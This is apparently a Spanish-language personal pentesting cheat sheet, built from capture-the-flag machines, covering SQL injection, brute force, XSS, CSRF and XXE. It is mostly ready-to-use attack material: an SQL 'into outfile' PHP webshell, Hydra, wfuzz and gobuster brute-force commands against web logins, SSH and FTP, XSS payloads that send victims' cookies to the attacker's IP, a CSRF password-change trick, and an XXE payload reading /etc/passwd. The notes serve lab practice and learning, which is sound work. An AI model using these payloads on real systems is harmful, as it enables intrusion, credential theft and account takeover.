`‘union select 1,”probando”,3 into outfile “C:\\\inetpub\\wwwroot\\prueba.txt”-- -`  
Para un servidor Windows escapamos las barras por si diera problemas, y si no las quitas, hay que probar.

Si hay posibilidad de escritura nos creamos una webshell para luego llamarla y para dentro!:

`‘union select 1,”<?php system($_REQUEST[‘cmd’]); ?>”,3 into outfile “C:\\\inetpub\\wwwroot\prueba.txt”-- -`  
Igual hay que escapar las comillas del cmd para que no de problemas. Y ya desde navegador apuntas a la ruta y añades `...?cmd=COMANDO`

---

## Ataque de Fuerza Bruta

### **¿En que consiste?**

Un ataque de fuerza bruta es un intento de descifrar una contraseña o nombre de usuario, de buscar una página web oculta o de descubrir la clave utilizada para cifrar un mensaje. Consiste en aplicar el método de prueba y error con la esperanza de dar con la combinación correcta. Agradecimientos a la web de Kaspersky por la definición.

### **¿Qué veremos aquí?**
Veremos ataques de fuerza bruta a panales de login con la herramienta Hydra, Wfuzz y scripting en python.  
Para fuerza bruta en archivos y subdirectorios usaré wfuzz y gobuster.

### **Diccionarios**
Para los ataques de fuerza bruta usamos diccionarios. El que suelo usar es el de SecLists, lo encontrarás en github.  
Si los creo yo para hacer el diccionario personalizado uso herramientas tales como: Cewl, Crunch y Psudohash.

### **Explotación**

**Usando Hydra:** 

Estructura y comandos:

+ La `l` o la `p` es minúscula o mayúscula dependiendo de si quieres usar un usuario/contraseña específico o una diccionario. Para especifico en minúsculas para diccionario en mayús.

+ Si da fallo al ejecutar tienes que eliminar el hydra.restore, suele pasar cuando cancelas durante un proceso de hydra, comando:
```
> rm hydra.restore
```

+ Sobretodo usar hydra en paneles sin CSRF Token ni otros requerimientos extra.

**A paneles de sesión:**

Si la petición va por GET -recuerda que lo puedes ver en la consola del navegador-:
```
> hydra -l admin -P <diccionarioElRockyouXjemplo> <ip> <http-get> <rutaDespuesdeIp> -t <nº>
```

Ejemplo de uso visto en máquina **Inferno**:
```
> hydra -l admin -P /usr/share/wordlist/rockyou.txt 192.168.5.5 http-get /inferno -t 50
```

En el anterior caso el panel login se daba en una ventana emergente de la página. Así que, aparte de los casos normales, en situaciones de ventana emergente también se puede hacer.

Si la petición va por POST es un poquillo más largo:
```plaintext
> hydra -l USER -P DICCIO IP http-post-form "Ruta:DataporPost:FraseRespuestaInválida” -t NUMERO
```
El campo de fuerza bruta de la contraseña se describe como ^PASS^.

Ejemplo, visto en máquina **Nineveh**:  
``` plaintext
> hydra -l admin -P <elrockyou.txt> 10.10.14.52 http-post-form “/deparment/login.php:username=admin&password=^PASS^:Invalid Password” -t 50
```

También se podría poner asi:  
``` plaintext
> hydra -l admin -P <elrockyou.txt> “http-post-form://10.10.14.52/department/login.php:username=^USER^&password=^PASS^:Invalid Password” -t 50
```

**A ssh:**
``` plaintext
> hydra -l <user> -P <diccionario> ssh://<ip> -t 50
```
``` plaintext
> hydra -L <diccionarioUsers> -P <diccioPasswd> ssh://<ip> -t 20
```
**A ftp:**
``` plaintext
> hydra -L <diccioUsers> -P <diccioPasswd> ftp://<ip> -t 20
```
**WFUZZ**

Estructura y comandos:

Para subdirectorios:
``` plaintext
Wfuzz -c –-hc=404 -t 200 -w <diccionario> http://<ip>/FUZZ
```
Si quieres añadir una barra al final para que te encuentre archivos como .cgi añade la slash /
Para añadir extensiones a la búsqueda opción **-z**:
``` plaintext
> wfuzz -c --hc=404 -w /share/lists/direct../elmedium -z list,txt-php http://<ip>/FUZZ.FUZ2Z
```

Para subdominios:

Ejemplo de máquina **Forge**:
``` plaintext
> wfuzz -c --hc -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forge.htb" http://forge.htb
```
Para panel de login:
``` plaintext
> wfuzz -c -t 200 -w <diccionario> -d <‘ladataporRAW’> <direccionIP>
```
Al poner -d ya entiende que hay data por POST y no es necesario indicarlo. Un ejemplo en la máquina **Teacher**:
``` plaintext
> wfuzz -c –-hh=434 -t 200 -w <diccionario> -d ‘username=giovani&password=FUZZ’ http://teacher.htb/moodle/login/index.php
```
Puse –hh=434 porque en la solicitud previa –igual a esa pero sin esa opción- todos los resultados daban 434 carateres en la respuesta, así que la que salga distinta será la buena.  
Puedes añadir las opciones --ss/--hs regex, de show/hide responses, sirve para mostrar u ocultar las respuestas que te de la web, ejemplo; --hs “Not account found with that username.”


**GOBUSTER**

Para subdirectorios:
```
> gobuster dir -u <http://ip> -w <diccionario> -t 100
```
Si la dirección es https entonces añade la opción **-k**   
-k: skip certificate SSL

Si quieres añadir una barra al final para que te encuentre archivos como .cgi añade la opción **–add-slash**

Para subdominios:
```
> gobuster vhost -u <http://domino> -w <eldeSubdomains top1million-5000 porejemplo> -t 100  
```
Para que te siga la redirección usa la opción **-r**.

Para añadir extensiones añades opcion **-x**. Por ejemplo;
-x php,txt

**Python fuerza bruta a panel login**

¿Cuándo pensamos en hacerlo?

Cuando nos apetezca, pero de normal lo suelo hacer cuando hay un TokenCSRF dinámico o cualquier otra data aparte de la contraseña que sea dinámica/variable.

ADJUNTAR AQUI ENLACE A SCRIPTS

Un ejemplo bastante bueno de este tipo de ataque con python está en la máquina **Blunder**.

---

## XSS - Cross Site Scripting

### **¿Qué es?**
Es un tipo de ataque que implanta scripts maliciosos en un sitio web(web objetivo) a través ,normalmente, de campos de input de usuario. Otro usuario desprevenido, pudiera ser el administrador de la web, al abrir la página con el script lo ejecutaría sin darse cuenta. El alcanze suele ser el de la propia web, es decir, no puedes ejecutar comandos en la máquina objetivo. Se suelen utilizar estos tipos de ataque para robar credenciales-cookies a través de una redirección al usuario víctima, o para defacement en el sitio web.

### **¿Cuándo pensar en hacer?**
Suelo pensar en hacer cuando sé, o pienso, que un campo con capacidad de input pueda ser leído por otro usuario o por el administrador, es decir, cuando hay interacción de otro usuario, el cual al solicitar ese apartado web con mi input active el código malicoso.

### **Método**
Estos scripts se introducen en los inputs de usuario candidatos a ser leídos.

`<script>alert(“XSS”)</script>`  
Nos saldrá ventana emergente con la alerta de XSS si es vulnerable.

`<script src=”http://miIp/recurso.js></script>`  
Anterior comando podríamos usarlo solo para validar XSS o ya directamente para intentar robar la cookie. En mi máquina nos ponemos en escucha: 
```
> python3 -m http.server 80  
```  
Esperamos que nos llege alguna solicitud.

Si nos llega la solicitud podemos crear un recurso js malicioso que permita robar las cookies. También podríamos hacerlo directamente desde la primera petición. Contenido de ese js:
``` java
var request = new XMLHttpRequest();
request.open(‘GET’, ‘http://MiIp/?cookie=’ + document.cookie);
request.send();
```
Si no llegará nada prueba con `, true/false` después del document.cookie, es para señalar asincronía o no.

Si todo bien nos llegará la cookie, con ella podemos suplantar a ese usuario -cookie hijacking- añadiendo la cookie en la web -en consola web-.

También puedes usar este comando sin tener que crear el script js en tu máquina local:
`<script>document.location=”http://MiIp/?cookie=”+document.cookie></script>`

Piensa que igual el usuario puede pinchar en enlaces, podrias poner algo tan simple como **“Oye mira esto!!”; MIIP/recurso.php**

---
## XSRF/CSRF-Cross Site Request Forfery

### **¿Qué es?**

Ocurre en aplicaciones web y permite al atacante inducir a los usuarios a realizar acciones que no pretenden realizar, como por ejemplo, cambiar sus contraseñas y otros datos, realizar transferencia de fondos, etc.

**¿Cuándo pensar en hacer?**

Suelo pensar en hacer si sospecho de un XSS, es decir, alguien por detrás que esta viendo lo que nosotros vamos a meter en el input. No tiene porque ser vulnerable a inyección XSS(entendiendolo a través de un código malicoso, como el típico `<script>..`) porque ,por ejemplo, podrías pasar un enlace directamente y confiar en que pinche por curiosidad. También suelo observar si hay en la web un apartado de cambio de contraseñas u otro punto que pueda aprovecharme y si se puede hacer por el método GET.

**Método**

Ya sea de manera muy parecida al XSS o adjuntando algun comentario atrayente para que pinche a un recurso que tú le sirvas.

Si te llega la petición seguimos con el ataque.  
Para un cambio de contraseña por ejemplo; realizaría un cambio de password a mi usuario e interceptaría con burpsuite para ver como se manda, si es por POST intentar cambiar el método a GET a ver si se puede hacer esa vía.

Comprobado que se puede por GET pasaría esa misma dirección al usuario a suplantar, la dirección sería algo asi:   
`http://WebVictima/<cambioContraseña.php>?password=loquesea&confirm=loquesea`
  
Si hay suerte y pincha la víctima cambiaremos su contraseña y podremos acceder a su cuenta. Visto máquina **SecNotes**.

---

## XXE – XML External Entity

### **¿Qué es?**
Es una vulnerabilidad de seguridad web que permite a un atacante inferir con el procesamiento de datos XML de una aplicación. A menudo permite a un atacante ver el sistema de archivos tanto del objetivo como de máquinas al alcance de este último.

### **¿Cuándo pensar en hacer?**
Fácil, lo que menos me costo de aprender; Al ver que por detrás se procesa una estructura en XML, ya sea viendolo a través de burpsuite, desde el código fuente de la web u otras vías y pistas que puedan dejar.

### **Método**
Intercepto con Burpsuite la petición XML y añado el código de [payloadsAllTheThings][patt] y copio el classic xxe(el de foo):
``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
Lo que hago arriba es declarar una entidad llamada xxe y luego la llamo: `&xxe;`  
Si existen otras etiquetas que no sean foo puedes llamar a la entidad desde ese otro campo/etiqueta.

Ó también puedes usar el de xxe portswigger -Solo tienes que poner línea del medio teniendo en cuenta que ya esta puesta la primera línea de xml versión en el xml original, y luego llamarlo dentro de algún campo existente-:
  
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

Y si puedes leer archivos prueba por aquellos que puse en el apartado de LFI.

Si queremos leer archivos .php posiblemente tendremos que utilizar el wrapper de base64 -en el caso de que la página interprete php no podrás ver el código-, así que en lugar de `file:///loquesea` hay que meter:
`php://filter/convert.base64-encode/resource=<archivo.php>`

































































